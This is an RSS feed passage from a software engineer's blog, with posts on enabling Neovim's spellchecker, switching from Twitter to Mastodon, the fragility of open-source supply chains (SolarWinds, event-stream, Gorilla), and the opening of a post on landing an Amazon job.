<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>John McBride</title>
    <link>https://johncodes.com/</link>
    <description>Recent content on John McBride</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 25 Feb 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://johncodes.com/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>NeoVim: Using the spellchecker</title>
      <link>https://johncodes.com/posts/2023/02-25-nvim-spell/</link>
      <pubDate>Sat, 25 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/posts/2023/02-25-nvim-spell/</guid>
      <description>I know.
Any sane person&amp;rsquo;s editor already has spellchecking built in. And enabled by default. But I could never leave my beloved Neovim (and all the muscle memory I&amp;rsquo;ve built) just to spell things correctly! That&amp;rsquo;s why I became a programmer dammit! Who needs to know how to spell correctly when I can have single character variable names! Besides. We have tools. Isn&amp;rsquo;t that what computers are for!? Automate the boring stuff!</description>
      <content:encoded><![CDATA[
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/KoL-2WTlr04" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<hr>
<p><em>I know.</em></p>
<p>Any <em>sane</em> person&rsquo;s editor already has spellchecking built in.
And enabled by default.
But I could never leave my beloved Neovim
(and all the muscle memory I&rsquo;ve built) just to spell things correctly!
That&rsquo;s why I became a programmer dammit! Who needs to know how to spell correctly
when I can have single character variable names!
Besides. We have <em>tools</em>. Isn&rsquo;t that what computers are for!?
Automate the boring stuff! <em>(like spelling and grammar).</em></p>
<p>Thankfully, the long awaited <code>spell</code> integration features have landed in the NeoVim APIs.
While <code>spell</code> has been around forever (or at least as long as Vim has been),
<a href="https://github.com/neovim/neovim/pull/19419">only recently have the NeoVim Lua APIs</a>
been able to take advantage of it.
Now, by default, <em>without plugins</em>, nvim can make spelling suggestions and
treesitter can do the right things with misspellings in the
syntax highlighting, code parsing, and search queries.
Or in other words, <code>spell</code> is <em>waaay</em> nicer to use since it&rsquo;ll ignore code (but not other stuff).</p>
<p>This has already <em>greatly</em> increased my productivity when writing.
If you know anything about me (or have had the pleasure of working with me
and seeing my egregious spelling mistakes),
you know that I can <em>not</em> spell.
My reliance on good spell checker tools has really evolved into a dependency.
But no longer! Now, I can continue to convince myself that nvim
is a superior editor because it finally has <em>spell checking</em>.</p>
<p>In all seriousness, shout out to the NeoVim community and maintainers
for getting this feature in!! It&rsquo;s already been a huge value add
and saved me on <em>several</em> occasion from pushing an embarrassing commit message.</p>
<hr>
<h3 id="enabling-it">Enabling it</h3>
<p>Make sure you have a new-ish version of NeoVim.
I&rsquo;m running with a newer nightly build, but the latest official release should do the trick.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>‚ùØ nvim --version
</span></span><span style="display:flex;"><span>NVIM v0.9.0-dev-699+gc752c8536
</span></span></code></pre></div><p>In your nvim configuration files, you&rsquo;ll want to set the one of the following options:</p>
<ul>
<li><em>For those who&rsquo;ve ascended to using Lua</em>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>vim.opt.spelllang <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;en_us&#39;</span>
</span></span><span style="display:flex;"><span>vim.opt.spell <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><ul>
<li><em>Or good, ol trusty Vimscript</em>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vim" data-lang="vim"><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">spelllang</span>=<span style="color:#a6e22e">en_us</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">spell</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Alternatively, you can use the command prompt to enable <code>spell</code> in your current session:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>:setlocal spell spelllang=en_us
</span></span></code></pre></div><p>Note that <code>en_us</code> is <em>US English</em>.
But there are <em>tons</em> of supported languages out of the box:
<code>en_gb</code> for Great Britian English,
<code>de</code> for German, <code>ru</code> for Russian, and more.</p>
<p>Now, you should see words that are misspelled underlined! Nice!!</p>
<h3 id="using-it">Using it</h3>
<p>There are 3 default key-mappings my workflow has revolved around
for fixing spelling mistakes when I&rsquo;m writing.</p>
<h4 id="finding-words">Finding words:</h4>
<p><code>]s</code> will go to the <em>next</em> misspelled word.</p>
<p><code>[s</code> will go to the <em>previous</em> misspelled word.</p>
<p>Easy as that! These default key-mappings are designed to be composable
(or heck, modified in any way you like - this is NeoVim after all!)
so spend some time thinking about what re-mappings, key bindings,
or macros might make sense for you and your workflow.</p>
<h4 id="fixing-words">Fixing words:</h4>
<p>When the cursor is under a word that is misspelled,
<code>z=</code> will open the list of suggestions.
Typically, the first suggestion is almost always right.
Hit <code>1</code> and <code>&lt;enter&gt;</code> in the prompt to indicate you want to take the first suggestion.
And the word has been fixed!</p>
<p>There&rsquo;s also</p>
<pre tabindex="0"><code>:spellr
</code></pre><p>which is the &ldquo;spell repeater&rdquo;. It repeats the replacement done by <code>z=</code>
for all matched misspellings in the current window.
So, if there&rsquo;s a word you <em>frequently</em> misspell, using <code>:spellr</code> is a quick and easy
one stop shop for fixing <em>all</em> the misspellings of that type.</p>
<h3 id="adding-words-to-the-spellfile">Adding words to the spellfile</h3>
<p>If you&rsquo;ve typed a word that doesn&rsquo;t appear in the default dictionary,
<em>but is spelled correctly</em>, you can easily add it yourself to the internal spell list.
Especially in programming docs, there are <em>lots</em> of words not loaded into the default dictionary.
With your cursor under the <em>correctly</em> spelled word that is underlined as misspelled,
use the <code>zg</code> mapping to mark the word as a &ldquo;good&rdquo; word.</p>
<p>Doing this, you&rsquo;ll notice that NeoVim will automatically create a <code>spell/</code> directory
in the runtime path (typically under <code>~/.config/nvim</code>).
And in that directory, you&rsquo;ll find two files:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>~/.config/nvim/
</span></span><span style="display:flex;"><span>  |-- spell
</span></span><span style="display:flex;"><span>  |    |-- en.utf-8.add
</span></span><span style="display:flex;"><span>  |    |-- en.utf-8.add.spl
</span></span></code></pre></div><p>The <code>.add</code> file is a list of words you&rsquo;ve added.
For example, my <code>.add</code> file has <em>tech</em> words like &ldquo;Kubernetes&rdquo;
which don&rsquo;t typically appear in the default English dictionary.</p>
<p>The <code>.spl</code> file is a compiled binary &ldquo;spellfile&rdquo;.
And it&rsquo;s what is used to actually make suggestions and crawl the dictionary graph.
Creating spellfiles is &hellip; <em>rather</em> involved.
But, for most people, simply using <code>zg</code> to mark &ldquo;good&rdquo; words gets you 99% of the way there.</p>
<hr>
<p>As with most things NeoVim,
there are <em>excellent</em> docs and APIs for using the spell interface: <a href="https://neovim.io/doc/user/spell.html">https://neovim.io/doc/user/spell.html</a>
Especially if you plan to generate your own spellfiles
or programmatically modify text via the spell APIs,
these doc resources are a must read!</p>
<hr>
<p>If you found this blog post valuable, comment below,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a>
Your support means the world to me!!</p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>An elegant social media network for a more civilized age.</title>
      <link>https://johncodes.com/posts/2023/01-28-the-joy-of-mastodon/</link>
      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/posts/2023/01-28-the-joy-of-mastodon/</guid>
      <description>&amp;ldquo;This is the social media network of a software engineer. Not as clumsy or random as Twitter; an elegant network for a more civilized age.&amp;rdquo; ‚Äï obi-wan kenobi
Over the last week, I&amp;rsquo;ve abandoned my Twitter account in favor of diving head first into the world of Mastodon and the &amp;ldquo;Fediverse&amp;rdquo;. So far, it&amp;rsquo;s been a surprising, delightful, and enriching experience.
By the time I moved to Mastodon, I had some 3,000 followers on Twitter.</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/lite-saber-meme.png" alt="Mastodon, an elegant social media network"  />
</p>
<p><em>&ldquo;This is the social media network of a software engineer.
Not as clumsy or random as Twitter; an elegant network for a more civilized age.&rdquo; ‚Äï obi-wan kenobi</em></p>
<hr>
<p>Over the last week, I&rsquo;ve abandoned my Twitter account
in favor of diving head first into the world of Mastodon and the <em>&ldquo;Fediverse&rdquo;</em>.
So far, it&rsquo;s been a surprising, delightful, and enriching experience.</p>
<p>By the time I moved to Mastodon,
I had some <em>3,000</em> followers on Twitter.
But the platform has atrophied and changed in many sad ways.
Long gone are the days of fun technical deep dives,
inside scoops on your favorite projects,
and starting conversations with your technical peers.
Engagement (at least for me. Maybe I&rsquo;m very boring?)
is way down and the platform itself is breaking:
I haven&rsquo;t been able to reliably access my DMs for the better part of a week.</p>
<p>Instead, tech Twitter has been left with an exorbitant amount of <em>&ldquo;influencers&rdquo;</em> saying things like:
<em>&ldquo;As a developer, how many hours do you sleep&rdquo;</em>,
<em>&ldquo;10 reasons Next.js is the best thing since sliced bread!&rdquo;</em>,
and <em>&ldquo;How to get your first tech job in 6 months!&rdquo;</em>.
All shameless attempts to groom the <em>all seeing algorithm</em> in their favor.</p>
<p>For me, the interesting conversations had stifled and it was time to try something else.
Enter Mastodon; the blessed successor to many&rsquo;s beloved Twitter of a forgotten era!</p>
<p>Mastodon is abit weird though.</p>
<p>For one, there&rsquo;s no <em>&ldquo;algorithm&rdquo;</em>.
It&rsquo;s just a sequential timeline of stuff from people you follow.
For some who grew up in the age of never ending, dopamine dumping,
slot machine scrolling, <em>this might take awhile to get used to.</em>
But what you&rsquo;ll find instead is real <em>conversation</em>
and the ability to engage with those <em>people</em> directly.
I don&rsquo;t miss the days of inflammatory content designed to artificially drive up engagement.
I&rsquo;m happy it&rsquo;s been replaced in my social media life with a slower, more intentional feed.</p>
<p>In that same vein, you&rsquo;ll also notice that Mastodon is not a centralized place where <em>everyone</em> gathers
to share their hot takes. Instead, it&rsquo;s <em>&ldquo;federated&rdquo;</em> which means there are
<em>many different</em> Mastodon servers and services.
You can then <em>crawl</em> these different
server instances to connect with a distributed network; they&rsquo;re all interlinked.
So, if I have an account on <em>&ldquo;server A&rdquo;</em>,
I can still search, follow, and see content from people on <em>&ldquo;server B&rdquo;</em>.
All of <em>my content and information</em> lives on <em>&ldquo;server A&rdquo;</em>, but through the magic of the
internet and graph theory, a massive number of Mastodon servers can come together
to create <em>the great &ldquo;Fediverse&rdquo;</em>; independently hosted and maintained servers
that can all communicate together.</p>
<p>Or not.</p>
<p>It&rsquo;s also completely plausible to have a small Mastodon instance that is cut off from the Fediverse
where only people internal to that instance can interact with each-other.
That&rsquo;s the joy of open source technology
that you have the power to own, modify, and dictate the direction of.</p>
<p>To get started, you&rsquo;ll need to find a server that you want to join.
I picked <a href="https://fosstodon.org">fosstodon.org</a>
since its main focus is supporting people in the open source community.
Browsing the list of <a href="https://joinmastodon.org/servers">indexed servers</a>
is a great way to start and find a place that makes sense for you to call home.</p>
<h3 id="finding-your-twitter-network">Finding your Twitter network</h3>
<p>When you first get started, it can be hard trying to find people,
especially if you&rsquo;re coming from a large network on Twitter.</p>
<p>One of the Fediverse&rsquo;s biggest downfalls is a lack of an efficient and sensible search.
Because there could be any number of different web publishing platforms linked into the broader Fediverse,
there&rsquo;s no good way to index, search, and serve all of that distributed content at once.</p>
<p>Thankfully, there are a few handy tools to make this transition easier!
My favorite is <a href="https://twitodon.com/">Twitodon</a>. You sign in with your Twitter,
sign in with your Mastodon account, and it crawls your Twitter following to find
people in your existing network who have a Mastodon account. Then, you can export a CSV of your network
and import it directly into Mastodon!
(Don&rsquo;t forget to revoke Twitodon&rsquo;s access to Twitter and Mastodon once your done.
Thankfully, they provide the steps necessary to do that).</p>
<h3 id="user-experience">User experience</h3>
<p>The default Mastodon user interface and experience is not amazing.
And who can blame them.
Mastodon is a non-profit foundation building the open source platform
and hosting some of the biggest instances for pennies on the dollar.
They probably have more important things to worry about (<a href="https://github.com/mastodon/mastodon/issues/20673">like if they should support quote Toots</a>).</p>
<p>But, because the Fediverse is a thriving space full of tinkerers and hackers,
I have a few recommendations on taking your Mastodon experience to the next level:</p>
<h4 id="ivory">Ivory</h4>
<p><a href="https://tapbots.com/tweetbot/">Tweetbot was a favorite Twitter client for many people.</a>
Tapbots, the duo who created the iOS application, lovingly curated a <em>delightful</em> Twitter user experience.
But suddenly, a few weeks ago at the beginning of January,
Twitter shut down third party client access to the API.
And in one fell swoop, Tweetbot was no more.
Instead of sulking, Tapbots <em>immediately</em> got to work shipping their Mastodon iOS client, <a href="https://tapbots.com/ivory/">Ivory</a>.</p>
<p>And wow.</p>
<p>Before Ivory, Mastodon didn&rsquo;t really <em>&ldquo;make sense&rdquo;</em> for me.
Now, it&rsquo;s everything I hoped for; a beautiful user interface,
customizable buttons and actions, and notifications that actually work.
Even in it&rsquo;s <em>very early</em> access state, it&rsquo;s still a massive accomplishment.</p>
<p>For an iOS client (sorry Android people), I couldn&rsquo;t recommend Ivory enough.</p>
<h4 id="elkzone">Elk.zone</h4>
<p>So, what about a web client?
Well, let me introduce to you <a href="https://elk.zone">Elk.zone</a>,
a web client from members of the core <a href="https://vuejs.org/">Vue.js</a> team.</p>
<p>And it&rsquo;s really, <em>really</em> good. I would argue maybe even better than the Twitter web client user experience.
It&rsquo;s intuitive, it makes tons of sense, it has native lite and dark mode, etc.
And I shouldn&rsquo;t be surprised; anytime I come across a page built with Vue,
I&rsquo;m always impressed by the framework&rsquo;s output.</p>
<p>Huge shout out to this small team for accomplishing so much in such a short time!</p>
<hr>
<p>In short, as Twitter falls apart, there is a lovely home for you somewhere in the Fediverse.
It&rsquo;s growing day by day. And with lots of people tinkering on the platform,
it&rsquo;s user experience, features, and possibilities will only continue to thrive from here.
I can&rsquo;t wait to see you there and start a conversation:
<a href="https://fosstodon.org/@johnmcbride">https://fosstodon.org/@johnmcbride</a></p>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>There is no secure software supply-chain.</title>
      <link>https://johncodes.com/posts/there-is-no-secure-software-supply-chain/</link>
      <pubDate>Tue, 27 Dec 2022 09:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/posts/there-is-no-secure-software-supply-chain/</guid>
      <description>The Matrix, 1999
Years ago, entrepreneurs and innovators predicated that ‚Äúsoftware would eat the world‚Äù. And to little surprise, year after year, the world has become more and more reliant on software solutions. Often times, that software is (or indirectly depends on) some open source software, maintained by a group of people whose only affiliation to one another may be participation in that open source project‚Äôs community. But we‚Äôre in trouble.</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/neo-black-and-white.jpg" alt="The Matrix, 1990"  />
</p>
<p><em>The Matrix, 1999</em></p>
<hr>
<p>Years ago, entrepreneurs and innovators predicated that
<a href="https://a16z.com/2011/08/20/why-software-is-eating-the-world/">‚Äúsoftware would eat the world‚Äù.</a>
And to little surprise, year after year, the world has become more and
more reliant on software solutions. Often times, that software is (or
indirectly depends on) some open source software, maintained by a group of
people whose only affiliation to one another may be participation in that open
source project‚Äôs community. But we‚Äôre in trouble. The security of open source
software is under threat and we‚Äôre running out of people to reliably maintain
those projects. And as our stacks get deeper, our dependencies become more
interlinked, leading to terrifying compromises in the secure software
supply-chain. For a perfect example of what‚Äôs happening in the open source
world right now, we don‚Äôt need to look much further than the extremely popular
<a href="https://github.com/orgs/gorilla/repositories">Gorilla toolkit for Go.</a></p>
<p>As of this writing, in December of 2022, Gorilla has been archived, a project
that provided powerful web framework technology like mux and sessions. Over its
lengthy tenure, it was the de facto Go framework for web servers, routing
requests, handling HTTP traffic, and using websockets. It was used by tens of
thousands of other software packages and it came as a shock to most people in
the Go community that the project would be no more; no longer maintained, no
more releases, and no community support. But for anyone paying close enough
attention, the signs of turmoil were clear:
<a href="https://github.com/gorilla/websocket/issues/370">open calls for maintainers</a>
went unanswered, there were few active outside contributors, and the burden of
maintainership was very heavy.</p>
<p>The Gorilla framework was one of those ‚Äúimportant dependencies‚Äù. It sat at the
critical intersection of providing nice quality of life tools while still
securely handling important payloads. Developers would mold their logic around
the APIs provided by Gorilla and entire codebases would be shaped by the use of
the framework. The community at large trusted Gorilla; the last thing you want
in your server is a web framework riddled with bugs and CVEs. In the secure
software supply-chain, much like Nginx and OpenSSL, it‚Äôs a project that was at
the cornerstone of many other supply-chains and dependencies. If something went
wrong in the Gorilla framework, it had the potential to impact millions of
servers, services, and other projects.</p>
<p>The secure software supply-chain is one of those abstract concepts that giant
tech companies, security firms, and news outlets all love to buzz wording
about. It‚Äôs the ‚Äúidea‚Äù that the software you are consuming as a dependency, all
the way through your stack, is exactly the software you‚Äôre expecting to
consume. In other words, it‚Äôs the assurance that some hacker didn‚Äôt inject a
backdoor into a library or build tool you use, compromising your entire
product, software library, or even company. Supply-chain attacks are misgevious
because they almost never go after the actual intended target. Instead, they
compromise some dependency to then go after the intended target.</p>
<p>The classic example, still to this day, is
<a href="https://www.gao.gov/blog/solarwinds-cyberattack-demands-significant-federal-and-private-sector-response-infographic">the Solar Winds attack:</a>
some unnamed, Russian state-backed hacker group was able to compromise the internal
Solar Winds build system, leaving any subsequent software built using that
system injected with backdoors and exploits.
<a href="https://www.nytimes.com/2020/12/14/us/politics/russia-hack-nsa-homeland-security-pentagon.html">The fallout from this attack was massive.</a>
Many government agencies, including the State Department, confirmed
massive data breaches. The estimated cost of this attack continues to rise and
<a href="https://www.nytimes.com/2020/12/16/us/politics/russia-hack-putin-trump-biden.html">is estimated to be in the billions of dollars.</a></p>
<p>Product after product have popped up in the last few years to try and solve
these problems: software signing solutions, automated security scanning tools,
up to date CVE databases, automated bots, AI assisted coding tools, etc. There
was even a whole Whitehouse counsel on the subject. The federal government
knows this is the most important (and most critically vulnerable) vector to the
well being of our nation‚Äôs software infrastructure and they‚Äôve been taking
direct action to fight these kind of attacks.</p>
<p>But the secure software supply-chain is also one of those things that falls
apart quickly; without delicate handling and meticulous safeguarding, things go
south fast. For months, the Gorilla toolkit had an open call for maintainers,
seeking additional people to keep its codebases up to date, secure, and well
maintained. But in the end, the Gorilla maintainers couldn‚Äôt find enough people
to keep the project afloat. Many people volunteered but then were never seen
again. <a href="https://github.com/gorilla#gorilla-toolkit">And the bar for maintainer-ship was rightfully very high:</a></p>
<blockquote>
<p>just handing the reins of even a single software package that has north of 13k
unique clones a week (mux) is just not something I‚Äôd ever be comfortable with.
This has tended to play out poorly with other projects.</p>
</blockquote>
<p>And in the past, this has played out poorly in other projects:</p>
<p>In 2018, GitHub user FallingSnow opened
<a href="https://github.com/dominictarr/event-stream/issues/116">the issue ‚ÄúI don‚Äôt know what to say.‚Äù</a>
in the popular, but somewhat unknown, NPM JavaScript package event-stream. He&rsquo;d
found something very peculiar in recent commits to the library. A new
maintainer, not seen in the community before, with what appeared to be an
entirely new GitHub account, had committed a strange piece of code directly to
the main branch. This unknown new maintainer had also cut a new package to the
NPM registry, forcing this change onto anyone tracking the latest packages in
their project.</p>
<p>The changes looked like this: In a new file, a long inline encrypted string was
added. The string would be decoded using some unknown environment variable, and
then, that unencrypted string would be injected as a JavaScript module into the
package, effectively executing whatever code was hidden behind the encrypted
string. In short, unknown code was being deciphered, injected, and executed at
runtime.</p>
<p>The GitHub issue went viral. And through sheer brute force, abit of luck, and
hundreds of commenters, the community was able to decrypt the string, revealing
the injected code‚Äôs purpose: a crypto-currency ‚Äúwallet stealer‚Äù. If the code
detected a specific wallet on the system, it used a known exploit to steal all
the crypto stored in that wallet.</p>
<p>This exploitative code lived in the event-stream NPM module for months. Going
undetected by security scanners, consumers, and the project‚Äôs owner. Only when
someone in the community who was curious enough to take a look did this obvious
code-injection attack become clear. But what made this attack especially bad
was that the event-stream module was used by many other modules (and those
modules used by other modules, and so on). In theory, this potentially affected
thousands of software packages and millions of end-users. Developers who had no
idea their JavaScript used event-stream deep in their dependency stack were now
suddenly having to quickly patch their code. How was this even possible? Who
approved and allowed this to happen?</p>
<p><a href="https://github.com/dominictarr/event-stream/issues/116#issuecomment-440927400">The owner of the GitHub repository, and original author of the code, said:</a></p>
<blockquote>
<p>he emailed me and said he wanted to maintain the module, so I gave it to him. I
don&rsquo;t get any thing from maintaining this module, and I don&rsquo;t even use it
anymore, and havn&rsquo;t for years.</p>
</blockquote>
<p>and</p>
<blockquote>
<p>note: I no longer have publish rights to this module on npm.</p>
</blockquote>
<p>Just like that, just by asking, some bad actor was able to compromise tens of
thousands of software packages, going undetected through the veil of
‚Äúmaintainership‚Äù.</p>
<p>In the past, I‚Äôve referred to this as ‚ÄúThe Risks of Single Maintainer
Dependencies‚Äù: the overwhelming, often lonely, and sometimes dangerous
experience of maintaining a widely distributed software package on your own.
Like the owner of event-stream, most solo maintainers drift away, fading into
the background to let their software go into disarray.</p>
<p><a href="https://github.com/gorilla#gorilla-toolkit">This was the case with Gorilla:</a></p>
<blockquote>
<p>The original author and maintainer, moraes, had moved on a long time ago.
kisielk and garyburd had the longest run, maintaining a mix of the HTTP
libraries and gorilla/websocket respectively. I (elithrar) got involved
sometime in 2014 or so, when I noticed kisielk doing a lot of the heavy lifting
and wanted to help contribute back to the libraries I was using for a number of
personal projects. Since about ~2018 or so, I was the (mostly) sole maintainer
of everything but websocket, which is about the same time garyburd put out an
(effectively unsuccessful) call for new maintainers there too.</p>
</blockquote>
<p>The secure software supply-chain will never truly be strong and secure as long
as a single solo maintainer is able to disrupt an entire ecosystem of packages
by giving their package away to some bad actor. In truth, there is no secure
software supply-chain: we are only as strong as the weakest among us and too
often, those weak links in the chain are already broken, left to rot, or given
up to those with nefarious purposes.</p>
<p>Whenever I bring up this topic, someone always asks about money. Oh, money,
life‚Äôs truest satisfaction! And yes! Money can be a powerful motivator for some
people. But it‚Äôs a sad excuse for what the secure software supply-chain really
needs: true reliability. The software industry can throw all the money it wants
at maintainers of important open source projects,
<a href="https://www.theverge.com/23499215/valve-steam-deck-interview-late-2022">something Valve has started doing:</a></p>
<blockquote>
<p>Griffais says the company is also directly paying more than 100 open-source
developers to work on the Proton compatibility layer, the Mesa graphics driver,
and Vulkan, among other tasks like Steam for Linux and Chromebooks.</p>
</blockquote>
<p>but at some point, it becomes unreasonable to ask just a handful of people to
hold up the integrity, security, and viability of your companies entire product
stack. If it‚Äôs that important, why not hire some of those people, build a team
of maintainers, create processes for contribution, and allocate developer time
into the open source? Too often I hear about solving open source problems by
just throwing money at it, but at some point, the problems of scaling software
delivery outweigh any amount you can possibly pay a few people. Let‚Äôs say you
were building a house, it might make sense to have one or two people work on
the foundation. But if you‚Äôre zoning and building an entire city block, I‚Äôd
sure hope you‚Äôd put an entire team on planning, building, and maintaining those
foundations. No amount of money will make just a few people build a strong and
safe foundation all by themselves. But what we‚Äôre asking some open source
maintainers to do is to plan, build, and coordinate the foundations for an
entire world.</p>
<p><a href="https://github.com/gorilla#gorilla-toolkit">And this is something the Gorilla maintainers recognized as well:</a></p>
<blockquote>
<p>No. I don‚Äôt think any of us were after money here. The Gorilla Toolkit was,
looking back at the most active maintainers, a passion project. We didn‚Äôt want
it to be a job.</p>
</blockquote>
<p>For them, it wasn‚Äôt about the money, so throwing any amount at the project
wouldn‚Äôt have helped. It was about the software‚Äôs quality, maintainability, and
the kind of intrinsic satisfaction it provided.</p>
<p>So then, how can we incentivize open source maintainers to maintain their
software in a scalable, realistic way? Some people are motivated by the
altruistic value they provide to a community. Some are motivated by fame,
power, and recognition. Others still just want to have fun and work on
something cool. It‚Äôs impossible to understand the complicated, interlinked way
different people in an open source community are all motivated. Instead, the
best solution is obvious: If you are on a team that relies on some piece of
open source software, allocate real engineering time to contributing, being
apart of the community, and helping maintain that software. Eventually, you‚Äôll
get a really good sense of how a project operates and what motivates its main
players. And better yet, you‚Äôll help alleviate the heavy burden of solo
maintainership.</p>
<p>Sometimes, I like to think of software like its a wooden canoe, its many
dependencies making up the wooden strips of the boat. When first built, it
seems sturdy, strong, and able to withstand the harshest of conditions. Its
first coat of oil finish is fresh and beautiful, its wood grains smooth and
unbent. But as the years ware on, eventually, its finish fads, its wooden
strips need replacing, and maybe, if it takes on water, it requires time and
new material to repair. Neglected long enough, and its wood could mold and rot
from the inside, completely compromising the integrity of the boat. And just
like a boat, software requires time, energy, maintenance, and ‚Äúhands-on-deck‚Äù
to ensure its many links in the secure software supply-chain are strong.
Otherwise, the termites of time and the rot of bad-actors weaken links in the
chain, compromising the stability of it all.</p>
<p>In the end, the maintainers of the Gorilla framework did the right thing: they
decommissioned a widely used project that was at risk of rotting from the
inside out. And instead of let it live in disarray or potentially fall into the
hands of bad actors, it is simply gone. Its link on the chain of software has
been purposefully broken to force anyone using it to choose a better, and
hopefully, more secure option.</p>
<blockquote>
<p>I do believe that open source software is entitled to a lifecycle ‚Äî a
beginning, a middle, and an end ‚Äî and that no project is required to live on
forever. That may not make everyone happy, but such is life.</p>
</blockquote>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>How I got a job at Amazon as a software engineer</title>
      <link>https://johncodes.com/posts/aws-job/</link>
      <pubDate>Wed, 14 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/posts/aws-job/</guid>
      <description>If you&amp;rsquo;d like a view a video version of this article, check out the following:
In the summer of 2022, I left my job at VMware for Amazon Web Services. It was a bitter sweet journey; I loved my time at VMware and I loved working on some cutting edge things in the Kubernetes space. Even just a few months latter, the project I was working on is now completely defunct.</description>
      <content:encoded><![CDATA[<p><em>If you&rsquo;d like a view a video version of this article, check out the following:</em></p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/vcyXrlGKec4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<hr>
<p>In the summer of 2022, I left my job at VMware for Amazon Web Services.
It was a bitter sweet journey; I loved my time at VMware
and I loved working on some cutting edge things in the Kubernetes space.
Even just a few months latter, <a href="https://github.com/vmware-tanzu/community-edition">the project I was working on is now completely defunct.</a></p>
<p>The process to getting into AWS was no easy one.
But in the end, over the course of interviewing at many different companies,
I landed with 4 offers. I decided to go with AWS since it was the most compelling offer
and I get to work on some <a href="https://github.com/bottlerocket-os/bottlerocket">really cool technologies</a> I&rsquo;m excited about.</p>
<p>Here are my biggest pieces of advice for landing a job and the process I did to make it happen:</p>
<h2 id="1-study">1. Study</h2>
<p>I studied <em>alot</em> in preparation for my interviews.
Ontop of my 40hr/week job at VMware, I was studying an additional 20-30 hours a week for about 4 weeks.
This meant that for awhile, in the middle of July, all I was doing was working and studying.</p>
<p>But I was <em>very</em> focused on how I approached my interview prep and what things I wanted to tackle:</p>
<h4 id="the-14-principles-to-ace-any-coding-interviewhttpshackernooncom14-patterns-to-ace-any-coding-interview-question-c5bb3357f6ed"><a href="https://hackernoon.com/14-patterns-to-ace-any-coding-interview-question-c5bb3357f6ed">The 14 Principles to Ace Any Coding interview</a></h4>
<p>This is my all-time <em>favorite</em> resource for ramping up on coding interviews.
